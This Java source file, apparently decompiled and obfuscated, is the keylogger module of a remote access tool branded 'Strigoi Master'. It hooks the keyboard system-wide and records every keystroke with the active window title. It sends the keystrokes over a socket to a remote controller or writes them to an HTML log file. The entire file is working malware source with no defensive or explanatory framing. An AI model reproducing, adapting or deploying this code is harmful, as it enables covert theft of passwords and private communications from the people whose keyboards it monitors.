package carLambo;

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import javax.xml.bind.DatatypeConverter;
import lc.kra.system.keyboard.GlobalKeyboardHook;

public final class KeyLogger {
   private StringBuilder dfhttegd;
   private FileWriter bsgshsbs;
   private boolean gsbthstgb;
   private OutputStream sfsrgsbd;
   private boolean started;
   private boolean fgssdg;
   private Socket dsgsdfge;
   public static boolean offlineKeylogger = false;
   private String ertdbdth;
   public static boolean isEnabled = false;
   private FileReader sbsgssdfg;

   // $FF: synthetic method
   private static String sdfsldf(String var0) {
      try {
         byte[] var2 = DatatypeConverter.parseBase64Binary(var0);
         return new String(var2, "UTF-8");
      } catch (Exception var1) {
         return "";
      }
   }

   // $FF: synthetic method
   private void sdfsldf() {
      KeyLogger var10000;
      label27: {
         try {
            GlobalKeyboardHook var1 = new GlobalKeyboardHook(true);
            var10000 = this;
            var1.addKeyListener(new KeyAdapter(this));

            while(true) {
               if (!var10000.fgssdg || !isEnabled && !offlineKeylogger) {
                  var1.shutdownHook();
                  break;
               }

               Thread.sleep(128L);
               var10000 = this;
            }
         } catch (Exception var2) {
            var10000 = this;
            this.gsbthstgb();
            break label27;
         }

         var10000 = this;
      }

      var10000.gsbthstgb();
   }

   // $FF: synthetic method
   static boolean sdfsldf(KeyLogger var0) {
      return var0.gsbthstgb;
   }

   KeyLogger(Socket var1, String var2) {
      String var10000;
      label30: {
         
         this.fgssdg = true;
         this.started = false;
         this.gsbthstgb = false;
         this.dsgsdfge = var1;
         this.ertdbdth = var2;
         if (var1 != null) {
            label28: {
               try {
                  this.sfsrgsbd = var1.getOutputStream();
                  isEnabled = true;
               } catch (IOException var4) {
                  this.gsbthstgb();
                  break label28;
               }

               var10000 = var2;
               break label30;
            }
         }

         var10000 = var2;
      }

      KeyLogger var7;
      label23: {
         if (var10000 != null) {
            label21: {
               try {
                  String var5 = "<!DOCTYPE html><html><head><style>body{font-size:13px;font-family:verdana,helvetica,arial,sans-serif;color:#666666;background-color:#333333;margin:0px;}table{border-collapse:collapse;width:100%;color:#111111;table-layout:fixed;}tr{background-color:#ffffff;}th{color:#ffffff;background-color:#109055;border:1px solid #109055;padding:3px;vertical-align:top;text-align:left;}td{border:1px solid #d4d4d4;padding:5px;padding-top:7px;padding-bottom:7px;vertical-align:top;}h3,h4,h5,pre{font-size:13px;font-family:verdana,helvetica,arial,sans-serif;padding:0px;margin:0px;font-weight:normal;display:inline;}h2{color:#ffffff;}h3{color:#109055;}h4{color:#666666;}h5{color:#999999;}pre{white-space:pre-wrap;word-wrap:break-word;}</style></head><body><div class=\"center\" style=\"margin:auto;width:80%;\"><h2>Keyboard Log</h2><table><!--row--></table><p><small>Generated by Strigoi Master</small></p></div></body></html>";
                  this.bsgshsbs = new FileWriter(var2, false);
                  this.bsgshsbs.write(var5);
                  this.bsgshsbs.flush();
                  this.bsgshsbs.close();
                  this.dfhttegd = new StringBuilder();
                  offlineKeylogger = true;
                  this.dfhttegd();
               } catch (Exception var3) {
                  this.gsbthstgb();
                  break label21;
               }

               var7 = this;
               break label23;
            }
         }

         var7 = this;
      }

      KeyLogger var6 = var7;
      (new Thread(new KeyLoggerThread(var6))).start();
   }

   // $FF: synthetic method
   private void sabretb() {
      (new Thread(new KeyLoggerThread(this))).start();
   }

   // $FF: synthetic method
   static boolean setKeyloggerStarted(KeyLogger var0, boolean var1) {
      return var0.started = true;
   }

   // $FF: synthetic method
   static void sdfsldf(KeyLogger var0, String var1) {
      if (isEnabled) {
         var0.sabretb(var1);
      } else {
         if (offlineKeylogger) {
            var0.dfhttegd(var1);
         }

      }
   }

   // $FF: synthetic method
   private void sabretb(String var1) {
      try {
         this.sfsrgsbd.write(var1.getBytes());
         this.sfsrgsbd.flush();
      } catch (Exception var2) {
         this.gsbthstgb();
      }
   }

   // $FF: synthetic method
   static boolean sabretb(KeyLogger var0, boolean var1) {
      return var0.gsbthstgb = var1;
   }

   // $FF: synthetic method
   private void dfhttegd(String var1) {
      try {
         if (!this.started) {
            this.dfhttegd.append(var1);
         } else {
            if (!this.dfhttegd.toString().equals("")) {
               KeyLogger var6 = this;
               KeyLogger var10004 = this;
               this.sbsgssdfg = new FileReader(this.ertdbdth);
               StringBuilder var2 = new StringBuilder();
               char[] var3 = new char[1024];

               int var4;
               while((var4 = var10004.sbsgssdfg.read(var3)) != -1) {
                  var10004 = var6;
                  var2.append(new String(var3, 0, var4));
               }

               var6.sbsgssdfg.close();
               var1 = var2.toString();
               this.bsgshsbs = new FileWriter(this.ertdbdth, false);
               String var7 = (new StringBuilder()).insert(0, "<tr><td><pre><h3>WINDOW:</h3><br/><h4>").append(sdfsldf(ConnectionUtil.currentWindowName())).append("</h4></pre></td></tr>").toString();
               var7 = (new StringBuilder()).insert(0, var7).append("<tr><td><pre>").append(this.dfhttegd.toString()).append("</pre></td></tr><!--row-->").toString();
               var1 = var1.replace("<!--row-->", var7);
               this.bsgshsbs.write(var1);
               this.bsgshsbs.flush();
               this.bsgshsbs.close();
               this.dfhttegd = new StringBuilder();
            }

            this.dfhttegd();
         }
      } catch (Exception var5) {
         this.gsbthstgb();
      }
   }

   // $FF: synthetic method
   private void dfhttegd() {
      this.started = false;
      (new Thread(new KeyLoggerStarter(this))).start();
   }

   // $FF: synthetic method
   private void bsgshsbs(String var1) {
      if (isEnabled) {
         this.sabretb(var1);
      } else {
         if (offlineKeylogger) {
            this.dfhttegd(var1);
         }

      }
   }

   // $FF: synthetic method
   private String bsgshsbs() {
      try {
         KeyLogger var10000 = this;
         this.sbsgssdfg = new FileReader(this.ertdbdth);
         StringBuilder var1 = new StringBuilder();
         char[] var2 = new char[1024];

         int var3;
         while((var3 = var10000.sbsgssdfg.read(var2)) != -1) {
            var10000 = this;
            var1.append(new String(var2, 0, var3));
         }

         this.sbsgssdfg.close();
         return var1.toString();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }

   // $FF: synthetic method
   static void listener(KeyLogger var0) {
      var0 = var0;

      KeyLogger var10000;
      label28: {
         try {
            GlobalKeyboardHook var1 = new GlobalKeyboardHook(true);
            var10000 = var0;
            var1.addKeyListener(new KeyAdapter(var0));

            while(true) {
               if (!var10000.fgssdg || !isEnabled && !offlineKeylogger) {
                  var1.shutdownHook();
                  break;
               }

               Thread.sleep(128L);
               var10000 = var0;
            }
         } catch (Exception var2) {
            var10000 = var0;
            var0.gsbthstgb();
            break label28;
         }

         var10000 = var0;
      }

      var10000.gsbthstgb();
   }

   // $FF: synthetic method
   private void gsbthstgb() {
      KeyLogger var10000;
      label25: {
         this.fgssdg = false;
         if (this.dsgsdfge != null) {
            label23: {
               try {
                  isEnabled = false;
                  this.sfsrgsbd.close();
                  this.dsgsdfge.close();
               } catch (IOException var2) {
                  break label23;
               }

               var10000 = this;
               break label25;
            }
         }

         var10000 = this;
      }

      if (var10000.ertdbdth != null) {
         try {
            offlineKeylogger = false;
            this.bsgshsbs.close();
         } catch (Exception var1) {
            ;
         }
      }

      System.out.println("KeyloggerEx Shutdown");
   }
}
